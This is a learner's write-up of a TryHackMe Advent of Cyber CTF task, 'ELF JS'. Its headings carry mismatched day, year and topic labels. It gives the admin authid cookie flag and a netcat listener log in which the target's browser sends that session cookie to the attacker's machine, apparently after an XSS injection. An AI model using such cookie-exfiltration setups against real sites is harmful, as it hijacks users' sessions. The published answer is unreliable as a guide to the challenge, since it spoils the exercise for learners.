<p align="center">November 30, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{208}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Advent of Cyber 2023, Day 14, Machine Learning}}$$

</h1>
<p align="center">Get started with Cyber Security in 24 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/adventofcyber2023">Advent of Cyber 2023</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/f59c6a13-447f-4f2a-ade0-a28bc0f05118">
  <img height="150px" src="https://github.com/user-attachments/assets/7a3dd02f-39d7-4e1e-b64d-e0ec60bdb2f2">

</p>

<h2>[Day 18] ELF JS<a id='1'></a></h2>


<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>What is the admin's authid cookie value?</em><br><a id='1.1'></a>
>> <code><strong>2564799a4e6689972f6d9e1c7b406f87065cbf65</strong></code><br><br>

<br>


<h3 align="center">Accessed the machine at http://[Target]:3000.<br>
                 <img width="900px" src="https://github.com/user-attachments/assets/b06c2908-e0e1-49ec-bb2e-2cd977145df3"> </h3>
<br>




<pre><code>$root@[AttackBox]:~/AdventOfCyber2019# nc -lvnp 4242
Listening on 0.0.0.0 4242
Connection received on [Target] 47950
GET /page?param=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
Host: [AttackBox]:4242
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate

</code></pre>



<h2>Task Complete<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/6afbfd0b-2856-4388-b18d-aa23d9881677"> </h3>


<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/f5495115-3f1d-4749-bceb-fc42716cb2a8"> </h3>


<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
